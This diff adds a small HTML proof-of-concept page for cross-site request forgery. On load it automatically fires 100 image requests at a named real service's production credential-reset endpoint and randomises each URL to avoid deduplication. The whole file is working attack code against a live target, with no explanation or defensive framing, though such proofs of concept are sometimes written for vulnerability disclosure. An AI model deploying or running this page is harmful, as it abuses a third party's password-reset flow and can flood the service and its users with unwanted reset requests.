@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+    <script>
+        function sendCSRFRequests() {
+            const targetURL = "https://console.neon.tech/realms/prod-realm/login-actions/reset-credentials?client_id=neon-console&tab_id=jgnRsc-wPWM";
+            for (let i = 0; i < 100; i++) {
+                const img = new Image();
+                img.src = `${targetURL}?nocache=${Math.random()}`; // Unique URL to bypass deduplication
+            }
+        }
+    </script>
+</head>
+<body onload="sendCSRFRequests()">
+    <h1>CSRF PoC</h1>
+    <p>Requests are sent automatically when the page loads.</p>
+</body>
+</html>
